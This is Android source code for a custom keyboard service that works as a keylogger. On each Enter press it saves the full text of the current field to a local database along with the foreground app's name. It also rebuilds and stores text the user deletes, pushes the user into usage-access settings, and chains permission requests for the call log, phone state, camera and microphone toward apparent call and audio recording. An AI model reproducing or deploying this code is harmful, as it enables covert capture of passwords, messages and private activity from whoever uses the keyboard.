package com.example.keyboard;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.speech.RecognitionListener;
import android.speech.RecognizerIntent;
import android.speech.SpeechRecognizer;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;
import android.view.inputmethod.InputMethodManager;
import android.widget.EditText;
import android.widget.Toast;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;
import androidx.fragment.app.FragmentActivity;
import androidx.fragment.app.FragmentManager;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.SortedMap;
import java.util.TreeMap;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

public class EDMTKeyboard extends InputMethodService implements KeyboardView.OnKeyboardActionListener {


    private static final int REQUEST_MICROPHONE = 1;
    private KeyboardView kv;
    private Keyboard keyboard;
    EditText ed_txt;

    private boolean isCaps = false;
    private boolean isMic_on = false;
    private boolean recordstarted;

    private static final int REQUEST_CODE = 0;
    private DevicePolicyManager mDPM;
    private ComponentName mAdminName;

    MediaRecorder recorder;
    File audiofile = null;
    static final String TAG = "MediaRecording";

    String str="";
    String str2="";

    String appname="";

    String del_txt="";
    int I=0;
    int del_flag=0;
    int del_aft_txt=0;

    DBHelper DB;
    //TService Tser;

   // @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    @SuppressLint("InflateParams")
    @Override
    public View onCreateInputView() {
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard,null);
        keyboard = new Keyboard(this,R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        DB = new DBHelper(this);



//        ActivityCompat.requestPermissions(EDMTKeyboard.this, new String[]{READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE}, PackageManager.PERMISSION_GRANTED);

     //   StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
       // StrictMode.setVmPolicy(builder.build());


       // Intent intent = new Intent(this, TService.class);
        //startService(intent);


        return kv;
    }

    private boolean isAccessGranted() {

        try {
            PackageManager packageManager = getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(getPackageName(), 0);
            AppOpsManager appOpsManager = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = 0;
            if (android.os.Build.VERSION.SDK_INT > android.os.Build.VERSION_CODES.KITKAT) {
                mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                        applicationInfo.uid, applicationInfo.packageName);
            }
            return (mode == AppOpsManager.MODE_ALLOWED);

        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }


    @Override
    public void onPress(int i) {

    }

    @Override
    public void onRelease(int i) {

    }



    @SuppressLint("UseCompatLoadingForDrawables")
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    @Override
    public void onKey(int i, int[] ints) {

        InputConnection ic = getCurrentInputConnection();
        playClick(i);

        if (!isAccessGranted()) {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }

        if (isAccessGranted()) {
            switch (i) {
            case Keyboard.KEYCODE_DELETE:


                CharSequence selectedText = ic.getSelectedText(0);


                if (TextUtils.isEmpty(selectedText)) {

                    if (I != 0)
                        I--;

                    CharSequence del_seq = ic.getTextBeforeCursor(1, 0);
                    String del_ch = del_seq.toString();

                    if (del_ch.length() == 0) {
                        del_flag = 0;
                        if (!del_txt.equals("")) {
                            StringBuilder sb = new StringBuilder(del_txt);
                            sb.reverse();
                            del_txt = new String(sb);


                            appname = Foreground_app(1);

                            Boolean checkinsertdata = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                            del_txt = "";
                        }
                    }

                    if (del_flag == 0) {
                        if (del_ch.length() != 0) {
                            del_flag = 1;
                            CharSequence del_seq2 = ic.getTextAfterCursor(1000, 0);
                            String del_ch2 = del_seq2.toString();
                            del_aft_txt = del_ch2.length();
                            del_txt = del_ch;
                        }

                    } else {
                        if (del_ch.length() != 0) {
                            CharSequence del_seq3 = ic.getTextAfterCursor(1000, 0);
                            String del_ch3 = del_seq3.toString();
                            if (del_ch3.length() == del_aft_txt)
                                del_txt = del_txt + del_ch;
                            else {
                                StringBuilder sb = new StringBuilder(del_txt);
                                sb.reverse();
                                del_txt = new String(sb);

                                appname = Foreground_app(1);


                                Boolean checkinsertdata = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                                CharSequence del_seq4 = ic.getTextAfterCursor(1000, 0);
                                String del_ch4 = del_seq4.toString();
                                del_aft_txt = del_ch4.length();
                                del_txt = del_ch;
                            }
                        }

                    }

                    ic.deleteSurroundingText(1, 0);

                    CharSequence del_seq2 = ic.getTextAfterCursor(1000, 0);
                    String del_ch2 = del_seq2.toString();
                    CharSequence del_seq3 = ic.getTextBeforeCursor(1000, 0);
                    String del_ch3 = del_seq3.toString();

                    if (del_ch3.length() == 0 && del_flag == 1) {
                        del_flag = 0;
                        if (!del_txt.equals("")) {
                            StringBuilder sb = new StringBuilder(del_txt);
                            sb.reverse();
                            del_txt = new String(sb);
                            appname = Foreground_app(1);
                            Boolean checkinsertdata = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                            del_txt = "";
                        }
                    }


                }
                else {
                    String select_str = selectedText.toString();
                    ic.commitText("", 1);
                    del_flag = 0;
                    Boolean res;


                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }

                    appname = Foreground_app(1);
                    Boolean checkinsertdata = DB.insertuserdata(new DataTyped("Erased", select_str, appname));

                    del_txt = "";

                    I = I - select_str.length();
                    if (I < 0)
                        I = 0;
                }

                // StringBuffer sb= new StringBuffer(str);

                //if(sb.length() != 0) {
                //..sb.deleteCharAt(sb.length()-1); }

                //str = new String(sb);

                break;
            case Keyboard.KEYCODE_SHIFT:

                Boolean res;
                if (del_flag == 1) {
                    del_flag = 0;
                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }

                isCaps = !isCaps;
                keyboard.setShifted(isCaps);
                kv.invalidateAllKeys();

                Keyboard currentKeyboard = kv.getKeyboard();
                List<Keyboard.Key> keys = currentKeyboard.getKeys();
                //kv.invalidateKey(Keyboard);

                for (int iii = 0; iii < keys.size() - 1; iii++) {
                    Keyboard.Key currentKey = keys.get(iii);

                    //If your Key contains more than one code, then you will have to check if the codes array contains the primary code
                    if (currentKey.codes[0] == Keyboard.KEYCODE_SHIFT) {
                        currentKey.label = null;
                        if (!isCaps) {
                            currentKey.icon = getDrawable(R.drawable.ic_up_arrow1);
                            break;
                        } else {
                            currentKey.icon = getDrawable(R.drawable.ic_up_arrow2);
                            break;
                        }
                    }
                }


                break;

            case -7:


                if (del_flag == 1) {
                    del_flag = 0;
                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }

                // DATABASE INTERFACE
                Intent dbmanager = new Intent(this, AndroidDatabaseManager.class);
                dbmanager.setFlags(FLAG_ACTIVITY_NEW_TASK);
                startActivity(dbmanager);

                break;

            case -66:

                if (del_flag == 1) {
                    del_flag = 0;
                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }

                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    Intent micact3 = new Intent(this, MyCall.class);
                    micact3.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    startActivity(micact3);
                }

                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

                    Intent micact3 = new Intent(this, MyContact.class);
                    micact3.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    startActivity(micact3);

                }

                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {

                    Intent micact2 = new Intent(this, MyMicrophone.class);
                    micact2.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    startActivity(micact2); }


                    if (ContextCompat.checkSelfPermission(this,
                            Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
                    {

                        if (ContextCompat.checkSelfPermission(this,
                                Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {

                            if (ContextCompat.checkSelfPermission(this,
                                    Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {

                        Intent callrec2 = new Intent(this, MainCall.class);
                        callrec2.setFlags(FLAG_ACTIVITY_NEW_TASK);
                        startActivity(callrec2); } }
                    }

                break;

            case -50:


                if (del_flag == 1) {
                    del_flag = 0;
                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }


                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                        != PackageManager.PERMISSION_GRANTED) {


                    Intent camact2 = new Intent(this, MyCamera.class);
                    camact2.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    startActivity(camact2);

                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                        == PackageManager.PERMISSION_GRANTED) {
                    Intent camact = new Intent(this, MyCameraActivity.class);
                    camact.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    startActivity(camact);
                }


                break;

            case Keyboard.KEYCODE_DONE:

                //ActivityManager manager = (ActivityManager)(EDMTKeyboard.this).getSystemService(Context.ACTIVITY_SERVICE);
                //List<ActivityManager.RunningAppProcessInfo> tasks = manager.getRunningAppProcesses();

                //final ActivityManager activityManager = (ActivityManager)
                //        getSystemService(Context.ACTIVITY_SERVICE);
                //final List<ActivityManager.RunningTaskInfo> recentTasks = Objects.requireNonNull(activityManager).getRunningTasks(Integer.MAX_VALUE);
                //for (int ii = 0; ii < recentTasks.size(); ii++) {
                //                    Log.i("Application executed: ",recentTasks.get(ii).baseActivity.toShortString());
                //   }


                if (del_flag == 1) {
                    del_flag = 0;
                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }
                CharSequence bef_seq = ic.getTextBeforeCursor(1000, 0);
                String bef_str = bef_seq.toString();
                CharSequence aft_seq = ic.getTextAfterCursor(1000, 0);
                String aft_str = aft_seq.toString();

                String final_str = bef_str + aft_str;
                //ic.setSelection(final_str.length()+1,final_str.length()+1);

                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));


                //str2 = ed_txt.getText().toString();


                Boolean checkinsertdata;

                if (final_str.length() != 0) {


                    appname = Foreground_app(1);
                    checkinsertdata = DB.insertuserdata(new DataTyped("Entered", final_str, appname));

                    // ed_txt.setText("");

                    if (checkinsertdata) {
                        Toast.makeText(EDMTKeyboard.this, final_str, Toast.LENGTH_SHORT).show();
                    }
                }

                str = "";
                I = 0;


                //  Log.d("Reading: ", "Reading all contacts..");

                // List<DataTyped> data_stored = DB.getAllData();

                // for (DataTyped cn : data_stored) {
                //   String log = "ID: "+  cn.getID() + " ,Phone: " +
                //         cn.getData();

                //    Log.d("Name: ", log);
                //}


                break;

            case -32:

                // REC AUDIO
                if (del_flag == 1) {
                    del_flag = 0;
                    if (!del_txt.equals("")) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }


                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    Intent micact = new Intent(this, MyMicrophone.class);
                    micact.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    startActivity(micact);
                }

                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    if (!isMic_on) {

                        Keyboard currentKeyboard2 = kv.getKeyboard();
                        List<Keyboard.Key> keys2 = currentKeyboard2.getKeys();
                        //kv.invalidateKey(Keyboard);

                        for (int iii = 0; iii < keys2.size() - 1; iii++) {
                            Keyboard.Key currentKey = keys2.get(iii);

                            //If your Key contains more than one code, then you will have to check if the codes array contains the primary code
                            if (currentKey.codes[0] == -32) {
                                currentKey.label = null;


                                currentKey.icon = getDrawable(R.drawable.ic_mic_rec);
                                break;

                            }
                        }


                        isMic_on = true;
                        File dir = getFilesDir();
                        audiofile = new File(dir, "sound.ogg");
                        recorder = new MediaRecorder();
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            recorder.setOutputFormat(MediaRecorder.OutputFormat.OGG);
                        } else {
                            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        }
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        recorder.setOutputFile(audiofile.getAbsolutePath());
                        try {
                            recorder.prepare();
                        } catch (IOException e) {
                            e.printStackTrace();
                            Toast.makeText(EDMTKeyboard.this, "ERROR: Make sure no other app is using the microphone", Toast.LENGTH_SHORT).show();

                        }

                        recorder.start();
                        Toast.makeText(EDMTKeyboard.this, "Recording Started", Toast.LENGTH_SHORT).show();
                    } else {

                        Keyboard currentKeyboard2 = kv.getKeyboard();
                        List<Keyboard.Key> keys2 = currentKeyboard2.getKeys();

                        for (int iii = 0; iii < keys2.size() - 1; iii++) {
                            Keyboard.Key currentKey = keys2.get(iii);

                            //If your Key contains more than one code, then you will have to check if the codes array contains the primary code
                            if (currentKey.codes[0] == -32) {
                                currentKey.label = null;

                                currentKey.icon = getDrawable(R.drawable.ic_mic_off_512);
                                break;

                            }
                        }


                        isMic_on = false;
                        recorder.stop();
                        recorder.reset();
                        recorder.release();
                        recorder = null;
                        //recorder.release();
                        Toast.makeText(EDMTKeyboard.this, "Recording Stopped", Toast.LENGTH_SHORT).show();

                        PackageManager packageManager = getPackageManager();

                        Intent sendIntent = new Intent();
                        sendIntent.setAction(Intent.ACTION_SEND);
                        File file1;
                        file1 = new File(getApplicationContext().getFilesDir(), "sound.ogg");


                        Uri uri = FileProvider.getUriForFile(
                                EDMTKeyboard.this,
                                "com.example.keyboard.provider", file1);


                        //Uri uri = Uri.fromFile(file1);
                        Log.e("Path", "" + uri);
                        sendIntent.putExtra(Intent.EXTRA_STREAM, uri);
                        sendIntent.setType("audio/*");
                        //sendIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        sendIntent.addFlags(FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
                        startActivity(sendIntent);


                        UsageStatsManager usm2 = (UsageStatsManager) this.getSystemService(Context.USAGE_STATS_SERVICE);

                        final Handler handler = new Handler(Looper.getMainLooper());
                        handler.postDelayed(() -> {
                            appname = Foreground_app(2);
                            try {
                                DB.insertaudiodata(file1, appname, "Shared");
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }, 7000);
                    }


                    //getNameFromApp(packageManager,sendIntent);


                }


                break;

            case -3:

                // SPEECH TO TEXT


                if (del_flag == 1) {
                    del_flag = 0;
                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }

                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    Intent micact2 = new Intent(this, MyMicrophone.class);
                    micact2.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    startActivity(micact2);
                }

                if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    Intent intent = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
                    intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL,
                            RecognizerIntent.LANGUAGE_MODEL_FREE_FORM);
                    intent.putExtra(RecognizerIntent.EXTRA_CALLING_PACKAGE,
                            "com.example.keyboard");


                    SpeechRecognizer recognizer = SpeechRecognizer
                            .createSpeechRecognizer(this.getApplicationContext());

                    RecognitionListener listener = new RecognitionListener() {

                        @Override
                        public void onReadyForSpeech(Bundle params) {
                            Toast.makeText(EDMTKeyboard.this, "Recording Started", Toast.LENGTH_SHORT).show();
                        }

                        @Override
                        public void onBeginningOfSpeech() {
                            Toast.makeText(EDMTKeyboard.this, "Recording Started", Toast.LENGTH_SHORT).show();
                        }

                        @Override
                        public void onRmsChanged(float rmsdB) {

                        }

                        @Override
                        public void onBufferReceived(byte[] buffer) {

                        }

                        @Override
                        public void onEndOfSpeech() {

                        }

                        @Override
                        public void onError(int error) {
                            System.err.println("Error listening for speech: " + error);
                            Toast.makeText(EDMTKeyboard.this, "ERROR: Make sure no other app is using the microphone", Toast.LENGTH_SHORT).show();
                            //Toast.makeText(EDMTKeyboard.this, "ERROR-"+error, Toast.LENGTH_SHORT).show();

                        }

                        @Override
                        public void onResults(Bundle results) {

                            //Bundle bundle = intent.getExtras();


                            ArrayList<String> voiceResults = results
                                    .getStringArrayList(SpeechRecognizer.RESULTS_RECOGNITION);


                            if (voiceResults == null) {
                                System.out.println("No voice results");
                            } else {
                                System.out.println("Printing matches: ");
                                for (String match : voiceResults) {
                                    Toast.makeText(EDMTKeyboard.this, match, Toast.LENGTH_SHORT).show();
                                    ic.commitText(match, match.length());
                                    str = str + match;
                                    I = I + match.length() + 1;
                                    //System.out.println(match);
                                }
                            }

                        }

                        @Override
                        public void onPartialResults(Bundle partialResults) {

                        }

                        @Override
                        public void onEvent(int eventType, Bundle params) {

                        }
                    };
                    recognizer.setRecognitionListener(listener);
                    recognizer.startListening(intent);
                }

                break;


            default:


                if (del_flag == 1) {
                    del_flag = 0;
                    if (del_txt.length() != 0) {
                        StringBuilder sb = new StringBuilder(del_txt);
                        sb.reverse();
                        del_txt = new String(sb);
                        appname = Foreground_app(1);
                        res = DB.insertuserdata(new DataTyped("Erased", del_txt, appname));
                    }
                    del_txt = "";
                }
                char code = (char) i;

                if (Character.isLetter(code) && isCaps)
                    code = Character.toUpperCase(code);


                //Log.e("date:", mydate);


                //if(str.length()==0)
                //{   dup = code;
                //   str = Character.toString(dup);}
                //else
                str = str + code;

                I++;
                ic.commitText(String.valueOf(code), 1);
        }

    }

    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    private String Foreground_app(int x) {

        UsageStatsManager usm = (UsageStatsManager) this.getSystemService(Context.USAGE_STATS_SERVICE);

        String currentApp = "NULL";
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {

            long time = System.currentTimeMillis();
            List<UsageStats> appList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY,  time - 1000*1000, time);
            if (appList != null && appList.size() > 0) {
                SortedMap<Long, UsageStats> mySortedMap = new TreeMap<>();
                for (UsageStats usageStats : appList) {
                    mySortedMap.put(usageStats.getLastTimeUsed(), usageStats);
                }
                if(x==1) {
                mySortedMap.remove(mySortedMap.lastKey());}
                if (!mySortedMap.isEmpty()) {
                    currentApp = Objects.requireNonNull(mySortedMap.get(mySortedMap.lastKey())).getPackageName();
                }
            }
        }
        Log.e(TAG, "Current App in foreground is: " + currentApp);

        return currentApp;


    }


    public void getNameFromApp(PackageManager packageManager, Intent sendIntent) {

        @SuppressLint("QueryPermissionsNeeded") List<ResolveInfo> resolveInfos = packageManager.queryIntentActivities(sendIntent, 0);

        int lastDot = 0;

        String packageName = "";
        String name="";

        for (int i = 0; i < resolveInfos.size(); i++) {

            // Extract the label, append it, and repackage it in a LabeledIntent
            ResolveInfo resolveInfo = resolveInfos.get(i);
            packageName = resolveInfo.activityInfo.packageName;


            lastDot= packageName.lastIndexOf(".");

            name = packageName.substring(lastDot + 1);
            Log.i("TAAAG",name);
        }



    }




    private void playClick(int i) {

        AudioManager am = (AudioManager)getSystemService(AUDIO_SERVICE);
        switch(i)
        {
            case 32:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:


            case 10:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default: am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }

    @Override
    public void onText(CharSequence charSequence) {

    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }
}